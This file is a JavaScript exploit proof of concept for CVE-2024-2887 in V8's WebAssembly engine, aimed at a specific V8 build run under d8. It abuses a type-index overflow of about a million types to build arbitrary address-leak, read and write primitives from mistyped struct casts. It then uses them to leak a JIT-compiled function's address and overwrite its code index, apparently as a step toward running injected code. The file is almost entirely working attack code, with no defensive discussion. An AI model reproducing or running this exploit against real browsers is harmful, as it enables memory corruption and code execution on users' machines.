d8.file.execute("E:\\CVE-2024-2887\\v8\\wasm-module-builder.js")
// v8 build: a33e9e87328f2d92c6c861a517da661c9f86782a

function dp(obj)    {%DebugPrint(obj);}
function dpp(ptr)   {%DebugPrintPtr(ptr);}

function foo()
{
    return [1.2107019523824e-309, 1.1, 
        2.5, 3.5
    ];
}

for(let i = 0; i < 0x1000; i++) foo(); //trigger maglev in this func


const builder = new WasmModuleBuilder();

let structInt = builder.addStruct([makeField(kWasmI32, true)]);
let structIntRef = builder.addStruct([makeField(wasmRefType(structInt), false)]);
let structIntRefRef = builder.addStruct([makeField(wasmRefType(structIntRef), false)]);
let structExternRef = builder.addStruct([makeField(kWasmExternRef, false)]);

builder.startRecGroup();
for (let i = 0; i < 1000000 - 4; i++)  
{
  builder.addType(kSig_i_iii);
}
builder.endRecGroup();

for (let i = 0; i < 13; i++) {// kNone is at 1000013
    //if (i == 6)
    //    leakStruct = builder.addStruct([makeField(kWasmI32, true), makeField(kWasmI32, true), makeField(kWasmI32, true), //kExtern
    //      makeField(kWasmI32, true), makeField(kWasmI32, true)]);
    //else
        builder.addStruct([makeField(kWasmI32, true)]);
  }

let structAnyRef = builder.addStruct([makeField(kWasmAnyRef, false)]); //kNone 1000013
//let structExternRef2 = builder.addStruct([makeField(kWasmExternRef, false)]); //kNone 1000013


let tmpSig = builder.addType(makeSig([kWasmExternRef], [kWasmI32]));
builder.addFunction('addrOf', tmpSig)
    .addBody([
      kExprLocalGet, 0, //push obj to stack
      kGCPrefix, kExprStructNew, structExternRef, // struct -> obj
      // use `wasmSignedLeb` to wrap a value large than 0xFF
      kGCPrefix, kExprStructNew, ...wasmSignedLeb(structAnyRef), // struct2 -> struct -> obj
      kGCPrefix, kExprRefCast, structIntRef,
      // get the addr of wasmStruct
      kGCPrefix, kExprStructGet, structIntRef, 0, // push struct to stack as a structInt
      kGCPrefix, kExprStructGet, structInt, 0 // get obj
    ]).exportFunc();

let readSig = builder.addType(makeSig([kWasmI32], [kWasmI32]))
builder.addFunction('read4', readSig)
      .addBody([
        kExprLocalGet, 0, //push int to stack
        kExprI32Const, 8,
        kExprI32Sub,
        kGCPrefix, kExprStructNew, structInt, // struct -> int
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(structAnyRef), // struct2 -> struct -> int
        kGCPrefix, kExprRefCast, structIntRefRef,  // struct2 -> refref -> ref -> int
        kGCPrefix, kExprStructGet, structIntRefRef, 0, 
        kGCPrefix, kExprStructGet, structIntRef, 0,
        kGCPrefix, kExprStructGet, structInt, 0,
      ]).exportFunc();

let writeSig = builder.addType(makeSig([kWasmI32, kWasmI32], []))
builder.addFunction('write4', writeSig)
      .addBody([
        kExprLocalGet, 0, //push int to stack
        kExprI32Const, 8,
        kExprI32Sub,
        kGCPrefix, kExprStructNew, structInt, // struct -> int
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(structAnyRef), // struct2 -> struct -> int
        kGCPrefix, kExprRefCast, structIntRefRef,  // struct2 -> refref -> ref -> int
        kGCPrefix, kExprStructGet, structIntRefRef, 0, 
        kGCPrefix, kExprStructGet, structIntRef, 0,
        kExprLocalGet, 1, //value 
        kGCPrefix, kExprStructSet, structInt, 0,
      ]).exportFunc();

const instance = builder.instantiate();
const exports = instance.exports;

let addrFunc = exports.addrOf(foo);
console.log('Func: ', addrFunc.toString(16));
let codeIndex = exports.read4(addrFunc + 0xc);
console.log('Code index: ', codeIndex.toString(16));
exports.write4(addrFunc + 0xc, 0x40000000);
